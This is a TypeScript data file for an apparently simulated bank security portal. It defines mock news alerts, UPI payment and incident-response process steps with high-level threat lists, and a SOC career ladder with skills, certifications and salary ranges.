  { id: 'news-001', title: 'ALERT: Coordinated Attack Campaign Targeting GFS Payment Systems', category: 'security', priority: 'critical', timestamp: new Date(Date.now() - 120000).toISOString(), summary: 'Multiple coordinated attacks targeting UPI Gateway, NEFT/RTGS systems, and Internet Banking detected. SOC is actively responding. All employees must report any suspicious activity immediately.', source: 'SOC — Suresh Reddy', author: 'Suresh Reddy', impact: 'Critical — Payment systems under active attack', relatedAlerts: ['ALT-2025-9001', 'ALT-2025-9002', 'ALT-2025-9003'] },
  { id: 'news-002', title: 'CDIP-2025 Batch 03 Interns Join Hyderabad SOC', category: 'hr', priority: 'normal', timestamp: new Date(Date.now() - 3600000).toISOString(), summary: 'The Cyber Defense Internship Program Batch 03 has begun. New interns are joining the Hyderabad SOC team under mentorship of Suresh Reddy and Naveen Kumar Yadav Loya (ShadowXLab Academy).', source: 'HR — Priya Sharma', author: 'Priya Sharma', impact: 'Team expansion — SOC staffing +2' },
  { id: 'news-003', title: 'PCI DSS v4.0 Audit Scheduled for Next Quarter', category: 'compliance', priority: 'high', timestamp: new Date(Date.now() - 7200000).toISOString(), summary: 'The PCI DSS v4.0 audit has been scheduled. All PCI CDE-related controls must be documented and evidence gathered by end of month. Compliance team will coordinate with each department.', source: 'Compliance — Deepa Nair', author: 'Deepa Nair', impact: 'High — All PCI CDE teams must prepare evidence' },
  { id: 'news-004', title: 'RBI Issues New Cybersecurity Framework Guidelines', category: 'compliance', priority: 'high', timestamp: new Date(Date.now() - 14400000).toISOString(), summary: 'RBI has released updated cybersecurity framework for regulated entities. GFS must implement new requirements within 90 days. Key areas: incident reporting timelines, cloud security controls, and data localization.', source: 'Compliance — Deepa Nair', author: 'Deepa Nair', impact: 'High — Regulatory implementation required' },
  { id: 'news-005', title: 'Azure India South — Scheduled Maintenance Tonight 02:00-04:00 IST', category: 'technology', priority: 'normal', timestamp: new Date(Date.now() - 21600000).toISOString(), summary: 'Planned maintenance on Azure India South region. Sentinel log ingestion may experience brief delays. CrowdStrike Falcon continues normal operations.', source: 'Cloud Operations — Aditya Kulkarni', author: 'Aditya Kulkarni', impact: 'Low — Sentinel may have brief log delay' },
  { id: 'news-006', title: 'CVE-2024-38077 Critical — Emergency Patching Required', category: 'security', priority: 'critical', timestamp: new Date(Date.now() - 28800000).toISOString(), summary: 'Critical RDP RCE vulnerability (CVSS 9.8) affects 8 production servers in PCI CDE. Emergency change approved. Patching scheduled for tonight. All PCI CDE servers will be briefly restarted.', source: 'Vulnerability Management — Nikhil Joshi', author: 'Nikhil Joshi', impact: 'Critical — 8 PCI CDE servers being patched tonight', relatedAlerts: ['ALT-2025-9010'] },
  { id: 'news-007', title: 'GFS Wins Best Cybersecurity Team — Indian Banking Awards 2025', category: 'general', priority: 'low', timestamp: new Date(Date.now() - 43200000).toISOString(), summary: 'GFS Cybersecurity Division has been recognized as the Best Cybersecurity Team at the Indian Banking Technology Awards 2025. Congratulations to the entire team!', source: 'HR — Kavitha Rao', author: 'Kavitha Rao', impact: 'Positive — Team recognition' },
  { id: 'news-008', title: 'Security Awareness Month — November 2025', category: 'hr', priority: 'normal', timestamp: new Date(Date.now() - 86400000).toISOString(), summary: 'November is Security Awareness Month at GFS. Mandatory security awareness training must be completed by all employees. Phishing simulation exercise scheduled for next week.', source: 'Security Awareness — Priya Sharma', author: 'Priya Sharma', impact: 'Medium — All employees must complete training' },
];

// ============================================================
// BUSINESS PROCESS FLOWS
// ============================================================

export interface ProcessStep {
  id: string;
  name: string;
  system: string;
  department: string;
  description: string;
  securityNotes: string[];
  threats: string[];
}

export interface BusinessProcess {
  id: string;
  name: string;
  description: string;
  trigger: string;
  steps: ProcessStep[];
  regulations: string[];
}

export const BUSINESS_PROCESSES: BusinessProcess[] = [
  {
    id: 'proc-upi', name: 'UPI Transaction Flow', description: 'End-to-end flow of a UPI payment from VPA resolution to settlement',
    trigger: 'Customer initiates UPI payment via mobile app or QR scan',
    regulations: ['NPCI UPI Guidelines', 'RBI Payment System Guidelines', 'DPDP Act'],
    steps: [
      { id: 'ps-001', name: 'Customer Initiates Payment', system: 'GFS Mobile App', department: 'Digital Banking', description: 'Customer enters VPA or scans QR code, enters amount, and authenticates with UPI PIN.', securityNotes: ['PIN entered on NPCI library — GFS never sees PIN', 'Device fingerprint validated', 'Session token checked'], threats: ['Phishing to obtain VPA', 'Malware overlay to capture PIN', 'Device compromise'] },
      { id: 'ps-002', name: 'API Gateway', system: 'GFS API Gateway (Kong)', department: 'Cloud Operations', description: 'Request validated by API gateway. Rate limiting, authentication, and request signing applied.', securityNotes: ['OAuth 2.0 token validated', 'Rate limiting: 100 req/min per device', 'TLS 1.3 enforced'], threats: ['API key theft', 'Rate limit bypass', 'Replay attacks'] },
      { id: 'ps-003', name: 'VPA Resolution', system: 'GFS UPI Gateway', department: 'Cards & Payments', description: 'VPA (e.g., user@gfs) resolved to bank account and IFSC via NPCI directory.', securityNotes: ['VPA validated against NPCI registry', 'Beneficiary bank confirmed', 'Transaction amount validated'], threats: ['VPA spoofing', 'Man-in-the-middle', 'NPCI directory compromise'] },
      { id: 'ps-004', name: 'Authentication', system: 'NPCI UPI Switch', department: 'Cards & Payments', description: 'Customer authenticates with 6-digit UPI PIN. NPCI validates PIN via issuing bank.', securityNotes: ['PIN validated by NPCI — not visible to GFS', 'Two-factor: device + PIN', 'Transaction signed'], threats: ['PIN capture via overlay', 'SIM swap for OTP', 'Session hijacking'] },
      { id: 'ps-005', name: 'Fraud Detection', system: 'GFS Fraud ML Engine', department: 'Fraud Prevention', description: 'Real-time ML model evaluates 40+ risk factors. Transaction scored in <50ms.', securityNotes: ['Device fingerprint check', 'Velocity analysis', 'Behavioral biometrics', 'Blacklist check'], threats: ['ML model evasion', 'Account takeover', 'Mule account networks'] },
      { id: 'ps-006', name: 'Debit from Account', system: 'Core Banking (FIS Profile)', department: 'Retail Banking', description: 'Amount debited from customer GFS account. Balance updated in real-time.', securityNotes: ['Transaction logged immutably', 'Double-entry bookkeeping', 'Reconciliation trigger'], threats: ['Transaction manipulation', 'Insider fraud', 'Database manipulation'] },
      { id: 'ps-007', name: 'Credit to Beneficiary', system: 'NPCI Settlement', department: 'Cards & Payments', description: 'NPCI processes inter-bank settlement. Beneficiary bank credits the receiving account.', securityNotes: ['NPCI settlement in T+0', 'Inter-bank reconciliation', 'Audit trail maintained'], threats: ['Settlement delay exploitation', 'Inter-bank fraud', 'NPCI system compromise'] },
      { id: 'ps-008', name: 'Confirmation & Notification', system: 'Notification Service', department: 'Digital Banking', description: 'Transaction confirmation sent to customer via SMS, push notification, and email.', securityNotes: ['Notification contains masked details', 'No sensitive data in SMS', 'Email encrypted'], threats: ['SMS spoofing', 'Phishing with fake confirmation'] },
      { id: 'ps-009', name: 'Audit Log', system: 'Splunk + Sentinel', department: 'SOC', description: 'Complete transaction logged to both Splunk (compliance) and Sentinel (security monitoring).', securityNotes: ['Immutable audit trail', '7-year retention', 'Real-time monitoring'], threats: ['Log manipulation', 'Log deletion'] },
      { id: 'ps-010', name: 'SOC Monitoring', system: 'Microsoft Sentinel', department: 'SOC', description: 'SOC analysts monitor for anomalies. Alerts generated for suspicious patterns.', securityNotes: ['420+ analytics rules', 'Real-time correlation', 'Automated response'], threats: ['Detection evasion', 'Alert fatigue exploitation'] },
    ],
  },
  {
    id: 'proc-incident', name: 'Security Incident Response', description: 'How GFS responds to a security incident from detection to resolution',
    trigger: 'Alert triggered in Sentinel, Falcon, or reported by employee',
    regulations: ['RBI Cyber Incident Reporting Framework', 'CERT-In Guidelines', 'IT Act 2000 Section 43A'],
    steps: [
      { id: 'ps-i01', name: 'Detection & Alert', system: 'Microsoft Sentinel / CrowdStrike', department: 'SOC', description: 'Automated detection rule or analyst identifies suspicious activity. Alert created in Sentinel.', securityNotes: ['Rules tuned for false positive reduction', 'MITRE ATT&CK mapped', 'Priority assigned'], threats: ['Detection evasion', 'Low-and-slow attacks', 'Alert fatigue'] },
      { id: 'ps-i02', name: 'Triage (Tier 1)', system: 'SOC Console', department: 'SOC', description: 'Tier 1 analyst performs initial triage: validate alert, check IP reputation, review MITRE mapping.', securityNotes: ['Follow triage checklist', 'Document all actions', 'Escalation criteria defined'], threats: ['Insufficient context', 'Time pressure errors'] },
      { id: 'ps-i03', name: 'Investigation (Tier 2/3)', system: 'Sentinel + Falcon + Splunk', department: 'SOC', description: 'Senior analyst investigates deeper — log correlation, timeline building, scope assessment.', securityNotes: ['Full log review', 'IOC extraction', 'Scope determination'], threats: ['Incomplete investigation', 'Evidence destruction'] },
      { id: 'ps-i04', name: 'Escalation & Classification', system: 'ServiceNow SIR', department: 'SOC / IR', description: 'Incident classified by severity. P1/P2 escalated to IR Lead and CISO. Stakeholder notification triggered.', securityNotes: ['Severity matrix applied', 'Communication tree followed', 'Evidence preservation started'], threats: ['Delayed escalation', 'Communication gaps'] },
      { id: 'ps-i05', name: 'Containment', system: 'CrowdStrike Falcon / Firewall', department: 'IR / SOC', description: 'Affected systems isolated. Malicious IPs blocked. Lateral movement contained.', securityNotes: ['Network isolation first', 'Memory preservation', 'Forensic snapshot'], threats: ['Incomplete containment', 'Lateral movement during containment'] },
      { id: 'ps-i06', name: 'RBI / CERT-In Reporting', system: 'GRC Portal', department: 'Compliance', description: 'Regulatory notifications filed within mandated timelines. RBI report within 6 hours for critical incidents.', securityNotes: ['RBI format followed', 'CERT-In report filed', 'Evidence attached'], threats: ['Late reporting penalties', 'Incomplete reports'] },
      { id: 'ps-i07', name: 'Eradication', system: 'Multiple (Falcon, AD, Firewall)', department: 'IR / Engineering', description: 'Remove malware, close attack vectors, patch vulnerabilities, rotate credentials.', securityNotes: ['Full malware removal', 'All persistence mechanisms found', 'Credentials rotated'], threats: ['Incomplete eradication', 'Hidden persistence'] },
      { id: 'ps-i08', name: 'Recovery', system: 'Backup Systems / DR', department: 'IR / IT Operations', description: 'Restore systems from clean backups. Verify integrity. Gradually restore connectivity.', securityNotes: ['Backup integrity verified', 'Clean state confirmed', 'Monitoring enhanced'], threats: ['Restoring from compromised backup', 'Re-infection'] },
      { id: 'ps-i09', name: 'Post-Incident Review', system: 'ServiceNow / Documentation', department: 'SOC / IR', description: 'Conduct post-mortem. Document lessons learned. Update playbooks and detections.', securityNotes: ['Blameless post-mortem', 'Action items tracked', 'Playbooks updated'], threats: ['Incomplete lessons learned', 'No follow-through on actions'] },
    ],
  },
];

// ============================================================
// CAREER CENTER (expanded)
// ============================================================

export interface CareerRole {
  id: string;
  title: string;
  level: number;
  duration: string;
  department: string;
  responsibilities: string[];
  skills: string[];
  certifications: string[];
  tools: string[];
  projects: string[];
  promotionRequirements: string[];
  salaryRange: string;
  icon: string;
  color: string;
}

export const CAREER_PATH: CareerRole[] = [
  {
    id: 'career-intern', title: 'Security Intern', level: 1, duration: 'Month 1-4', department: 'SOC — Hyderabad',
    responsibilities: ['Complete onboarding and training modules', 'Perform L1 alert triage under supervision', 'Assist with investigations', 'Document findings in ServiceNow', 'Attend shift handovers', 'Complete lab exercises'],
    skills: ['Networking basics', 'Windows/Linux fundamentals', 'SIEM basics (Sentinel)', 'Alert triage', 'KQL basics', 'Documentation'],
    certifications: ['CompTIA Security+ (preparatory)', 'SC-900 (preparatory)'],
    tools: ['Microsoft Sentinel', 'CrowdStrike Falcon', 'ServiceNow', 'Wireshark', 'KQL'],
    projects: ['First UPI fraud investigation', 'SOC shift shadowing', 'Vulnerability scan review', 'Phishing email analysis'],
    promotionRequirements: ['Complete all Foundation modules', 'Investigate 10 alerts independently', 'Pass technical assessment by Suresh Reddy', 'Pass mentor review by Naveen K. Yadav Loya'],
    salaryRange: '₹3-4 LPA (stipend)', icon: '👁️', color: 'var(--color-gfs-text-muted)',
  },
  {
    id: 'career-analyst-l1', title: 'SOC Analyst — Tier 1', level: 2, duration: 'Month 5-8', department: 'SOC — Hyderabad',
    responsibilities: ['Monitor alerts in real-time', 'Perform alert triage and classification', 'Escalate high-severity alerts', 'Maintain shift handover logs', 'Contribute to playbook updates', 'First response for P3/P4 alerts'],
    skills: ['Advanced KQL', 'Falcon investigation', 'Log analysis', 'Network analysis', 'MITRE ATT&CK mapping', 'Incident documentation'],
    certifications: ['CompTIA Security+', 'SC-200 (preparatory)'],
    tools: ['Sentinel', 'Falcon', 'Splunk', 'Wireshark', 'Nmap', 'ServiceNow'],
    projects: ['Independent P3 investigation', 'KQL detection rule creation', 'Shift lead rotation', 'Phishing campaign analysis'],
    promotionRequirements: ['Triage 500+ alerts with <5% false escalation', 'Resolve P3 incidents independently', 'Create 5+ detection rules', 'Pass GCIH or equivalent'],
    salaryRange: '₹6-9 LPA', icon: '🔍', color: 'var(--color-gfs-accent)',
  },
  {
    id: 'career-analyst-l2', title: 'SOC Analyst — Tier 2', level: 3, duration: 'Month 9-14', department: 'SOC — Hyderabad',
    responsibilities: ['Deep investigation of escalated alerts', 'Build attack timelines', 'Extract and share IOCs', 'Mentor Tier 1 analysts', 'Contribute to threat hunts', 'P2 incident handling'],
    skills: ['Advanced forensics', 'Malware triage', 'Advanced KQL/Splunk', 'Threat hunting', 'Forensic tools', 'Timeline analysis'],
    certifications: ['GCIH', 'GCIA', 'CEH'],
    tools: ['Volatility', 'Autopsy', 'Falcon IR', 'YARA', 'Sigma', 'Sysmon'],
    projects: ['Lead P2 investigation', 'Threat hunt participation', 'Malware analysis', 'Forensic acquisition'],
    promotionRequirements: ['Handle P2 incidents independently', 'Complete forensic certification', 'Lead 3+ threat hunts', 'Mentor 2 junior analysts'],
    salaryRange: '₹10-16 LPA', icon: '🔬', color: 'var(--color-gfs-blue)',
  },
  {
    id: 'career-threat-hunter', title: 'Threat Hunter', level: 4, duration: 'Month 15-24', department: 'Threat Intelligence — Hyderabad',
    responsibilities: ['Proactive threat hunting across enterprise', 'Hypothesis-driven investigations', 'Advanced detection engineering', 'APT tracking and analysis', 'Intelligence-driven defense', 'Purple team coordination'],
    skills: ['Advanced threat hunting', 'APT analysis', 'MITRE ATT&CK mastery', 'Data analytics', 'OSINT', 'Advanced forensics'],
    certifications: ['GCTI', 'GCFA', 'OSCP', 'GCFE'],
    tools: ['MISP', 'Recorded Future', 'Sentinel Hunting', 'Splunk ES', 'YARA', 'Sigma', 'OSINT tools'],
    projects: ['Lead APT hunt', 'Build hunting framework', 'APT actor profiling', 'Intelligence report for board'],
    promotionRequirements: ['Discover previously unknown threat', 'Build hunting framework from scratch', 'Present to CISO', 'Publish internal TI report'],
    salaryRange: '₹18-28 LPA', icon: '🧠', color: 'var(--color-gfs-amber)',
  },
  {
    id: 'career-ir', title: 'Incident Responder', level: 4, duration: 'Month 15-24', department: 'Incident Response — Hyderabad',
    responsibilities: ['Lead incident response for P1 incidents', 'Coordinate cross-functional response', 'Digital forensics acquisition and analysis', 'CERT-In and RBI reporting', 'Tabletop exercise facilitation', 'Post-incident reviews'],
    skills: ['Incident command', 'Digital forensics', 'Memory analysis', 'Network forensics', 'Malware analysis', 'Legal/regulatory awareness'],
    certifications: ['GCFE', 'GCFA', 'CHFI', 'EnCE', 'GCIH'],
    tools: ['Volatility', 'Autopsy', 'FTK Imager', 'Wireshark', 'Falcon IR', 'KAPE'],
    projects: ['Lead P1 response', 'Forensic investigation', 'CERT-In report', 'Tabletop exercise design'],
    promotionRequirements: ['Lead 5+ P1 responses', 'Complete forensic investigation', 'File CERT-In report', 'Design tabletop exercise'],
    salaryRange: '₹18-28 LPA', icon: '🚨', color: 'var(--color-gfs-red)',
  },
  {
    id: 'career-engineer', title: 'Security Engineer', level: 5, duration: 'Year 2-3', department: 'Security Engineering — Pune',
    responsibilities: ['Design and implement security controls', 'Cloud security architecture', 'Automation and scripting', 'Tool deployment and tuning', 'Hardening standards', 'Security architecture reviews'],
    skills: ['Cloud security (Azure/AWS)', 'Scripting (Python, PowerShell)', 'IaC (Terraform, Ansible)', 'Container security', 'Network security', 'Architecture design'],
    certifications: ['AWS Security Specialty', 'AZ-500', 'CKS', 'CISSP'],
    tools: ['Azure', 'AWS', 'Terraform', 'Ansible', 'Docker', 'Kubernetes', 'Vault', 'GitLab'],
    projects: ['Cloud security architecture', 'Automation framework', 'Tool deployment', 'Hardening standard'],
    promotionRequirements: ['Design security architecture', 'Implement automation framework', 'Deploy enterprise tool', 'Present to architecture board'],
    salaryRange: '₹22-35 LPA', icon: '⚙️', color: 'var(--color-gfs-purple)',
  },
  {
    id: 'career-architect', title: 'Security Architect', level: 6, duration: 'Year 3-5', department: 'Cybersecurity Division — Bengaluru',
    responsibilities: ['Design enterprise security architecture', 'Technology strategy', 'Vendor evaluation', 'Board reporting', 'Regulatory compliance design', 'Zero trust implementation'],
    skills: ['Enterprise architecture', 'Zero trust', 'Risk-based design', 'Vendor management', 'Board communication', 'Regulatory expertise'],
    certifications: ['CISSP', 'CCSP', 'TOGAF', 'ISO 27001 LA'],
    tools: ['Architecture platforms', 'GRC tools', 'Risk frameworks', 'Presentation tools'],
    projects: ['Zero trust architecture', 'Security strategy document', 'Vendor selection', 'Board presentation'],
    promotionRequirements: ['Design zero trust architecture', 'Present to Board', 'Lead regulatory audit', 'Mentor 5+ engineers'],
    salaryRange: '₹35-55 LPA', icon: '🏗️', color: 'var(--color-gfs-accent)',
  },
];
